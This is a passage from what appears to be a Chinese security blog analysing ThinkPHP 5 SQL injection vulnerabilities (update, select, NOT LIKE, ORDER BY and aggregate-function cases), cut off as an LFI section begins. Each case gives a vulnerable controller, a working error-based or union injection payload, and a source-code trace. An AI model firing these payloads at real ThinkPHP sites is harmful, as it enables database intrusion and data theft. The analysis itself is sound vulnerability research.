class="number">1</span>)</span><br></pre></td></tr></table></figure><p>显然上面case语句那里理论上<code>exp,inc,dec</code>都可以造成sql注入。但实际测试会发现只有<code>username[0]</code>为<code>exp</code>无法注入。这是因为thinkphp内置过滤会将exp处理变为<code>exp{空格}</code>。导致无法注入。</p><h2 id="tp5-sqli-update"><a href="#tp5-sqli-update" class="headerlink" title="tp5-sqli-update"></a>tp5-sqli-update</h2><p>配置Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        db(<span class="string">'users'</span>)-&gt;where([<span class="string">'id'</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致思路跟上面一样。只不过此处是update注入。我们同样可以跟到Query.php。发现其实调用的是Connection类的update方法。代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql  = <span class="keyword">$this</span>-&gt;builder-&gt;update($query);</span><br></pre></td></tr></table></figure><p>builder依旧是上面提过的Builder类对象。其update方法依旧是先调用parseData再进行sql语句的返回。我们来看看修复后的parseData的case语句<br><img src="/2020/08/05/Thinkphp-vuln/3.PNG" alt></p><p>default代码段parseArrayData</p><p><img src="/2020/08/05/Thinkphp-vuln/4.PNG" alt><br>(这里我composer装不了tp5.1.7,如果是之前的版本parseArrayData应该是直接返回false的)</p><p>可以看到最后其实result是这样形式的字符串<code>$fun(&#39;$point($value)&#39;)</code>。那与我们之前的基本没有什么区别,还是有拼接。直接构造成<code>updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</code>即可.所以我们前面只要进入default分支就能达成这里的sql语句构造了。</p><p>最后攻击payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><h2 id="tp5-sqli-select"><a href="#tp5-sqli-select" class="headerlink" title="tp5-sqli-select"></a>tp5-sqli-select</h2><p>配置Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where(<span class="string">'username'</span>,<span class="string">'exp'</span>,$username)-&gt;select();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'select success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>从成功执行注入的debug界面可以看到我们执行的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`users`</span> <span class="keyword">WHERE</span> ( <span class="string">`username`</span> ) <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># )</span></span><br></pre></td></tr></table></figure><p>这是一个tp5全版本的注入。不过似乎官方不认这个洞。<br>接下来直接跟下源码.<br>首先我们上面的<code>$username = request()-&gt;get(&#39;username&#39;);</code>会经过Request类调用input方法处理输入.但是这个input方法并没有起到过滤的作用。像我们payload中不含<code>/</code>和<code>.</code>的话就是直接原数据返回。</p><p>然后我们看到接下来调用的Query类的where方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($field, $op = null, $condition = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $param = func_get_args();</span><br><span class="line">    array_shift($param);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseWhereExp(<span class="string">'AND'</span>, $field, $op, $condition, $param);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parseWhereExp</code>这里不用深入,主要是分析查询模式。直接看返回值的话会发现设置了类中的<code>$options[&#39;where&#39;]</code>。我们主要看后面<code>select()</code></p><p>接下来依旧是tp5执行sql语句的老套路。实际调用的是Builder类的select 方法。这个方法调用了巨量的str_replace()用于填充语句。<br><img src="/2020/08/05/Thinkphp-vuln/5.PNG" alt><br>where语句是存在用户可控变量的。所以跟进<code>parseWhere</code>.然后发现调用<code>buildWhere</code></p><p>buildwhere代码量相对更多。但是同样存在一个for循环<code>foreach ($where as $key =&gt; $val)</code>.这里我们进入最后一个else。并且调用<code>parseWhereItem</code>。<br>而parseWhereItem中有这样的elseif</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="string">'EXP'</span> == $exp) &#123;</span><br><span class="line"><span class="comment">// 表达式查询</span></span><br><span class="line">    $whereStr .= <span class="string">'( '</span> . $key . <span class="string">' '</span> . $value . <span class="string">' )'</span>;</span><br></pre></td></tr></table></figure><p>此处key为username。value为可控变量。即可拼接达成注入。<br><img src="/2020/08/05/Thinkphp-vuln/6.PNG" alt></p><h2 id="tp5-0-sqli-select-5-0-10"><a href="#tp5-0-sqli-select-5-0-10" class="headerlink" title="tp5.0-sqli-select-5.0.10"></a>tp5.0-sqli-select-5.0.10</h2><p>5.0.10版本的sql注入。配置Index.php如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where([<span class="string">'username'</span> =&gt; $username])-&gt;select();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复现payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[0]&#x3D;not like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;) union select 1,user()#</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/7.PNG" alt><br>前面提到了我们的输入会经过Request的get()方法。它会一路调用input()，getFilter(),filterValue(),filterExp()来处理我们的输入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterExp</span><span class="params">(&amp;$value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>, $value)) &#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// TODO 其他安全过滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到像之前的exp会被变成<code>exp</code>的处理。但是5.0.10版本的过滤是有问题的。问题出在<code>NOTLIKE</code>上。其更新版本的处理是加入了<code>NOT LIKE</code>.</p><p>接下来跟上面那个全版本的sql注入可以按一样的流程走到parseWhereItem那。<br>我们的exp<code>not like</code>存在于this-&gt;exp这个数组.所以会进入底下<code>elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp)</code>的分支</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="string">'LIKE'</span> == $exp || <span class="string">'NOT LIKE'</span> == $exp) &#123;</span><br><span class="line"><span class="comment">// 模糊匹配</span></span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $array[] = $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseValue($item, $field);</span><br><span class="line">    &#125;</span><br><span class="line">    $logic = <span class="keyword">isset</span>($val[<span class="number">2</span>]) ? $val[<span class="number">2</span>] : <span class="string">'AND'</span>;</span><br><span class="line">    $whereStr .= <span class="string">'('</span> . implode($array, <span class="string">' '</span> . strtoupper($logic) . <span class="string">' '</span>) . <span class="string">')'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $whereStr .= $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseValue($value, $field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>$whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;</code>这拼接了logic变量。而login会在传入了<code>val[2]</code>的时候取自<code>val[2]</code>。这是一个用户可控变量。所以可以达成sql注入。剩下的我们直接在前面构造一个合理的not like的语句就能在后面进行union select 从而拼出一个完整的sql语句。<br><img src="/2020/08/05/Thinkphp-vuln/8.PNG" alt></p><p>今天先更这么多吧。看了php这么久果然还是nodejs更香……</p><h2 id="tp5-sqli-orderby"><a href="#tp5-sqli-orderby" class="headerlink" title="tp5-sqli-orderby"></a>tp5-sqli-orderby</h2><p>Index.php配置如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $orderby = request()-&gt;get(<span class="string">'orderby'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where([<span class="string">'username'</span> =&gt; <span class="string">'byc_404'</span>])-&gt;order($orderby)-&gt;find();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(数据库中users表已有byc_404用户)<br>这里使用tp5.1.22版本。注入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7e,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>从成功触发注入的位置我们可以看到sql语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`users`</span> <span class="keyword">WHERE</span> <span class="string">`username`</span> = <span class="string">'byc_404'</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`id`</span>|updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#` LIMIT 1</span></span><br></pre></td></tr></table></figure><p>跟下流程。首先5.1.22对输入做的过滤跟以往版本不太一样了。我们先看看get方法的处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get = $_GET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;get, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>input()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到如果我们的<code>$data</code>是数组的话。走的是<code>array_walk_recursive</code>。这个函数的作用是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : bool</span><br><span class="line">将用户自定义函数 callback 应用到 array 数组中的每个单元</span><br></pre></td></tr></table></figure><p>比如我写这样一个demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"testtest1232333"</span>,<span class="string">"b##"</span>=&gt;<span class="string">"tes#tt##est"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">echo</span>($str.<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$end=array_walk_recursive($a,<span class="string">'sanitize'</span>);</span><br></pre></td></tr></table></figure><p>自定义一个回调函数将字符中间的<code>#</code>替换为空。其输出为<br><img src="/2020/08/05/Thinkphp-vuln/9.PNG" alt></p><p>可以看到实际上只遍历了数组的值。没有处理数组的键。所以这里的filtervalue对数组的键没有任何影响。</p><p>之后执行语句操作时。我们的where仍然跟前面一样。将值存储在<code>$options</code>数组中。而接受我们用户输入<code>order</code>方法也是一样、最终值被完整存进<code>$this-&gt;options[&#39;order&#39;]</code>中</p><p>然后自然又是<code>find</code>了。它调用<code>Builder</code>类的<code>select</code>肯定已经非常熟悉了。不过这次我们orderby进入的是这个分支<code>$this-&gt;parseOrder($query, $options[&#39;order&#39;])</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">(Query $query, $order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'[rand]'</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">' '</span>, strpos($val, <span class="string">' '</span>) ? $val : $val . <span class="string">' '</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">' ORDER BY '</span> . implode(<span class="string">','</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里同样没有过滤。处理的函数只有一个parseKey。注意这里的parseKey是db/builder/Mysql.php中的parseKey。</p><p><img src="/2020/08/05/Thinkphp-vuln/10.PNG" alt></p><p>它对key的处理只是加了反引号环绕。因此其实没有做任何过滤。我们注入payload只需用注释符即可解决掉。</p><p>最后官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 <code>)</code>、<code>#</code> 两个符号</p><h2 id="tp5-sqli-Aggregatefunciton"><a href="#tp5-sqli-Aggregatefunciton" class="headerlink" title="tp5-sqli-Aggregatefunciton"></a>tp5-sqli-Aggregatefunciton</h2><p>tp5sql注入最后一个是mysql聚合函数导致的漏洞。 版本是5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 5.1.3&lt;=ThinkPHP5&lt;=5.1.25<br>不同版本利用payload需要微调。</p><p>例如5.1.22版本payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?options&#x3D;id&#96;)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/11.PNG" alt></p><p>我们还是跟进源码。从前面几次的经验我们已经可以总结出,tp5存在漏洞的几个版本对输入的过滤基本没有或者可以使用数组绕过。此处我们的输入同样没有受到过滤影响。因此直接从<code>$result = db(&#39;users&#39;)-&gt;max($options);</code>这里跟进max函数。发现进而调用了<code>aggregate</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span><span class="params">($aggregate, $field, $force = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseOptions();</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;connection-&gt;aggregate(<span class="keyword">$this</span>, $aggregate, $field);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'fetch_sql'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($force) &#123;</span><br><span class="line">        $result = (float) $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看到Connection类的aggregate</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span><span class="params">(Query $query, $aggregate, $field)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $field = $aggregate . <span class="string">'('</span> . <span class="keyword">$this</span>-&gt;builder-&gt;parseKey($query, $field, <span class="keyword">true</span>) . <span class="string">') AS tp_'</span> . strtolower($aggregate);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value($query, $field, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parsekey函数上面一个注入的例子提到了。是对我们的输入在两侧加反引号的作用。那么自然我们注入payload可以闭合加注释符解决掉。下面直接看value.value同样会调用我们非常熟悉的builder的select方法。只不过这次调用的是<code>parseField</code> 。最后还是没有做任何过滤处理。返回语句。</p><p>完整语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(<span class="string">`id`</span>)+updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#`) AS tp_max FROM `users` LIMIT 1</span></span><br></pre></td></tr></table></figure><p>至此tp5的sql注入系列就结束了。明天开始先看rce,之后是反序列化pop链。</p><h2 id="tp5-lfi"><a href="#tp5-lfi" class="headerlink" title="tp5-lfi"></a>tp5-lfi</h2><p>Index.php配置如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span 